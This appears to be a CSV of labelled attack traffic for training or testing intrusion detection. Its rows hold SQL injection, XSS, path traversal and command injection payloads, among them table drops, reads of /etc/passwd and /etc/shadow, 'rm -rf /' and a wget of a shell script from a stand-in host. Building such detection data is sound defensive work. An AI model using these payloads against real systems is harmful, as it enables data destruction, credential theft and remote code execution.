
srcIP,destIP,srcPort,destPort,protocol,payload,attackType
192.168.1.100,203.0.113.10,55000,3306,TCP,SELECT * FROM users WHERE id=1 OR 1=1,SQL_INJECTION
192.168.1.101,203.0.113.10,55001,3306,TCP,'; DROP TABLE users; --,SQL_INJECTION
192.168.1.102,203.0.113.10,55002,3306,TCP,admin' OR '1'='1,SQL_INJECTION
192.168.1.103,203.0.113.10,55003,3306,TCP,1' UNION SELECT password FROM admin--,SQL_INJECTION
192.168.1.104,203.0.113.10,55004,3306,TCP,'; EXEC sp_msforeachtable 'DROP TABLE ?'; --,SQL_INJECTION
192.168.1.105,203.0.113.10,55005,80,HTTP,/product?id=1' OR '1'='1' --,SQL_INJECTION
192.168.1.106,203.0.113.10,55006,80,HTTP,/login?user=admin'--&pass=any,SQL_INJECTION
192.168.1.107,203.0.113.10,55007,3306,TCP,SELECT LOAD_FILE('/etc/passwd'),SQL_INJECTION
192.168.1.108,203.0.113.10,55008,3306,TCP,1'; DELETE FROM logs WHERE '1'='1,SQL_INJECTION
192.168.1.109,203.0.113.10,55009,3306,TCP,' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --,SQL_INJECTION
192.168.1.110,203.0.113.10,55010,80,HTTP,<script>alert('XSS')</script>,XSS
192.168.1.111,203.0.113.10,55011,80,HTTP,<img src=x onerror=alert('XSS')>,XSS
192.168.1.112,203.0.113.10,55012,80,HTTP,<body onload=alert('XSS')>,XSS
192.168.1.113,203.0.113.10,55013,80,HTTP,<iframe src=javascript:alert('XSS')>,XSS
192.168.1.114,203.0.113.10,55014,80,HTTP,<svg/onload=alert('XSS')>,XSS
192.168.1.115,203.0.113.10,55015,80,HTTP,javascript:void(document.cookie),XSS
192.168.1.116,203.0.113.10,55016,80,HTTP,<input onfocus=alert('XSS') autofocus>,XSS
192.168.1.120,203.0.113.10,55020,80,HTTP,GET ../../../../etc/passwd HTTP/1.1,PATH_TRAVERSAL
192.168.1.121,203.0.113.10,55021,80,HTTP,GET ../../../windows/system32/config/sam HTTP/1.1,PATH_TRAVERSAL
192.168.1.122,203.0.113.10,55022,80,HTTP,/download?file=....//....//etc/shadow,PATH_TRAVERSAL
192.168.1.123,203.0.113.10,55023,21,FTP,RETR ../../../etc/passwd,PATH_TRAVERSAL
192.168.1.124,203.0.113.10,55024,80,HTTP,/files?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd,PATH_TRAVERSAL
192.168.1.130,203.0.113.10,55030,80,HTTP,; rm -rf /,COMMAND_INJECTION
192.168.1.131,203.0.113.10,55031,80,HTTP,| cat /etc/passwd,COMMAND_INJECTION
192.168.1.132,203.0.113.10,55032,80,HTTP,`whoami`,COMMAND_INJECTION
192.168.1.133,203.0.113.10,55033,80,HTTP,$(wget malicious.com/shell.sh),COMMAND_INJECTION
192.168.1.140,203.0.113.10,55040,1,TCP,SYN scan probe,PORT_SCAN
192.168.1.141,203.0.113.10,55041,65535,TCP,Full port range scan,PORT_SCAN
192.168.1.150,203.0.113.10,55050,80,HTTP,GET / HTTP/1.1 (flood attack - packet 1 of 10000),DOS
192.168.1.151,203.0.113.10,55051,443,HTTPS,SYN flood attack,DOS
